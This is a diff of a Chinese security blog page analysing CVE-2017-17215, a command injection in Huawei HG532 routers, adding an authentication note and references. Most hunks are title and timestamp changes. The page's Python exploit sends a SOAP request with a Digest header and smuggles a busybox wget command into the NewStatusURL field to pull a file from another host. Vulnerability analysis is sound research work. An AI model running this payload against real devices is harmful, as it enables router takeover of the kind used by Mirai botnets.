@@ -45,7 +45,7 @@
     
     <title>
         
-            CVE-2017-17215华为HG532命令注入漏洞分析 | 
+            CVE-2017-17215 - 华为HG532命令注入漏洞分析 | 
         
         穷则变，变则通，通则久
     </title>
@@ -239,18 +239,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="http://jinyu00.github.io">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="CVE-2017-17215华为HG532命令注入漏洞分析 | 穷则变，变则通，通则久">
+    <meta property="og:title" content="CVE-2017-17215 - 华为HG532命令注入漏洞分析 | 穷则变，变则通，通则久">
     <meta property="og:image" content="http://jinyu00.github.io/img/girl.png" />
     <meta property="og:description" content="">
     <meta property="og:article:tag" content="pwn"> <meta property="og:article:tag" content="CVE-2017-17215"> 
 
     
         <meta property="article:published_time" content="Thu Dec 28 2017 20:09:00 GMT+0800" />
-        <meta property="article:modified_time" content="Thu Dec 28 2017 20:58:52 GMT+0800" />
+        <meta property="article:modified_time" content="Thu Dec 28 2017 21:27:31 GMT+0800" />
     
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="CVE-2017-17215华为HG532命令注入漏洞分析 | 穷则变，变则通，通则久">
+    <meta name="twitter:title" content="CVE-2017-17215 - 华为HG532命令注入漏洞分析 | 穷则变，变则通，通则久">
     <meta name="twitter:description" content="">
     <meta name="twitter:image" content="http://jinyu00.github.io/img/girl.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -271,9 +271,9 @@
     "@context": "https://schema.org",
     "@type": "BlogPosting",
     "mainEntityOfPage": "http://jinyu00.github.io/2017/12/28/cve_2017_17215_hg532.html",
-    "headline": "CVE-2017-17215华为HG532命令注入漏洞分析",
+    "headline": "CVE-2017-17215 - 华为HG532命令注入漏洞分析",
     "datePublished": "Thu Dec 28 2017 20:09:00 GMT+0800",
-    "dateModified": "Thu Dec 28 2017 20:58:52 GMT+0800",
+    "dateModified": "Thu Dec 28 2017 21:27:31 GMT+0800",
     "author": {
         "@type": "Person",
         "name": "hac425",
@@ -398,7 +398,7 @@
         
     
             <p class="article-headline-p">
-                CVE-2017-17215华为HG532命令注入漏洞分析
+                CVE-2017-17215 - 华为HG532命令注入漏洞分析
             </p>
         </div>
 
@@ -480,7 +480,7 @@
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=CVE-2017-17215华为HG532命令注入漏洞分析&url=http://jinyu00.github.io/2017/12/28/cve_2017_17215_hg532.html&pic=http://jinyu00.github.io/img/girl.png&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=CVE-2017-17215 - 华为HG532命令注入漏洞分析&url=http://jinyu00.github.io/2017/12/28/cve_2017_17215_hg532.html&pic=http://jinyu00.github.io/img/girl.png&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 分享到微博
             </li>
@@ -489,7 +489,7 @@
 
     <!-- Share Twitter -->
     
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=CVE-2017-17215华为HG532命令注入漏洞分析&url=http://jinyu00.github.io/2017/12/28/cve_2017_17215_hg532.html&via=hac425" target="_blank">
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=CVE-2017-17215 - 华为HG532命令注入漏洞分析&url=http://jinyu00.github.io/2017/12/28/cve_2017_17215_hg532.html&via=hac425" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Twitter
             </li>
@@ -540,9 +540,14 @@
 <p>交叉引用找到使用位置。</p>
 <p><img src="http://oy9h5q2k4.bkt.clouddn.com/1514463431730l5deva3o.png?imageslim" alt="paste image"></p>
 <p>调用 <code>xml</code> 相关函数，获取值，拼接后，进入 <code>system</code></p>
-<p>exp:</p>
+<p>他还有 认证 机制，需要 <code>Authorization</code> 头 才能过掉 <code>check</code>, 否则会 <code>401</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15144675714407pfmdkor.png?imageslim" alt="paste image"></p>
+<p><strong>exp</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    &quot;Authorization&quot;: &quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</div><div class="line">&#125;</div><div class="line"></div><div class="line">data = &apos;&apos;&apos;&lt;?xml version=&quot;1.0&quot; ?&gt;</div><div class="line"> &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</div><div class="line">  &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</div><div class="line">   &lt;NewStatusURL&gt;;/bin/busybox wget -g 192.168.1.2 -l /tmp/1 -r /1;&lt;/NewStatusURL&gt;</div><div class="line">   &lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt;</div><div class="line">  &lt;/u:Upgrade&gt;</div><div class="line"> &lt;/s:Body&gt;</div><div class="line">&lt;/s:Envelope&gt;</div><div class="line">&apos;&apos;&apos;</div><div class="line">requests.post(&apos;http://192.168.1.1:37215/ctrlt/DeviceUpgrade_1&apos;,headers=headers,data=data)</div></pre></td></tr></table></figure>
-<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>找对固件很重要， 立个 <code>flag</code> ,两个月内不用 <code>f5</code></p>
+<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>找对固件很重要， 立个 <code>flag</code> ,两个月内不用 <code>f5</code>. 一个好的蜜罐就是<code>cve</code> 接收器呀<del>~</del>~~</p>
+<p><strong>参考</strong></p>
+<p><a href="https://blog.fortinet.com/2017/12/12/rise-of-one-more-mirai-worm-variant" target="_blank" rel="external">https://blog.fortinet.com/2017/12/12/rise-of-one-more-mirai-worm-variant</a></p>
+<p><a href="https://blog.fortinet.com/2017/12/12/rise-of-one-more-mirai-worm-variant" target="_blank" rel="external">https://blog.fortinet.com/2017/12/12/rise-of-one-more-mirai-worm-variant</a></p>
 
         
                 <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
